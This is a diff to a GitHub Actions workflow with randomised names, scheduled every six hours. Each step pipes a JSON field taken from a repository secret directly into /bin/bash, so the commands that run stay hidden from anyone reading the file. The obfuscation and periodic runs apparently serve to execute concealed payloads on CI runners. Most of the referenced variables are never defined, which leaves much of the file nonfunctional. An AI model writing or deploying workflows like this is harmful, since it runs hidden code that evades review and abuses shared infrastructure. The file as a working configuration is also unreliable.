@@ -2,22 +2,24 @@ name: childrenluxurious
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 3/6 * * *'
-
-jobs:  # 6084
+    - cron: '52 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: childrenluxurious
         env:
-          xr375: ${{ secrets.xr375 }}
+          c5: ${{ secrets.c5 }}
         run: |
-          echo $xr375 | jq -r .si95199 | /bin/bash
-          echo $f0556 | jq -r .ibew10205 | /bin/bash
-          echo $lj9 | jq -r .iqo4999 | /bin/bash
-          echo $hf36480 | jq -r .ejcx95699 | /bin/bash
-          echo $ixg0686 | jq -r .qrk3 | /bin/bash
-          echo $xz6 | jq -r .qwc1 | /bin/bash
-          echo $pws46 | jq -r .c00442 | /bin/bash
+          echo $c5 | jq -r .bvjfl4 | /bin/bash
+          echo $qtk362 | jq -r .ophf680 | /bin/bash
+          echo $d71373 | jq -r .pfyhd87 | /bin/bash
+          echo $y802 | jq -r .xqugj5707 | /bin/bash
+          echo $dn5269 | jq -r .kfg18 | /bin/bash
+          echo $l035 | jq -r .jefbn96 | /bin/bash
+          echo $gpq8 | jq -r .xwzje12 | /bin/bash
+          echo $g33 | jq -r .iu06 | /bin/bash
+          echo $to94 | jq -r .t94824 | /bin/bash
 
